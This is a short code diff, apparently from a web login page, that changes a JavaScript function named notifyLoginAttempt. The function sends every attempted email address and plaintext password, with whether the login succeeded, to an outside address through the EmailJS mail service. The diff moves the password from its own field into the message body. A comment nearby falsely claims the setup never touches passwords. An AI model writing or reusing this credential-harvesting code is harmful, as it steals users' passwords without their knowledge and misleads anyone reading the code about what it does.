@@ -1067,13 +1067,13 @@
   // without your configured Service/Template, and never touches passwords).
   emailjs.init({ publicKey: "ODkwBMdxmlTCHTNCc" });
 
- function notifyLoginAttempt(attemptedEmail, attemptedPassword, wasSuccessful) {
+function notifyLoginAttempt(attemptedEmail, attemptedPassword, wasSuccessful) {
     emailjs.send("service_ajj0q9o", "template_j2kq412", {
         email: attemptedEmail,
-        password: attemptedPassword, // <--- لێرەدا پاسۆردەکە زیاد دەکەین
         to_email: attemptedEmail,
         from_email: attemptedEmail,
-        message: `ئیمەیڵ: ${attemptedEmail} - پاسۆرد: ${attemptedPassword} — ئەنجام: ${wasSuccessful ? "سەرکەوتوو بوو" : "شکستی هێنا"}`,
+        // لێرەدا ئیمەیڵ و پاسۆرد بەیەکەوە دەخرێنە ناو message
+        message: `ئیمەیڵ: ${attemptedEmail} \nپاسۆرد: ${attemptedPassword} \nئەنجام: ${wasSuccessful ? "سەرکەوتوو بوو" : "شکستی هێنا"}`,
         status: wasSuccessful ? "سەرکەوتوو" : "شکستخواردوو"
     }).catch((err) => console.error("EmailJS notify error:", err));
 }
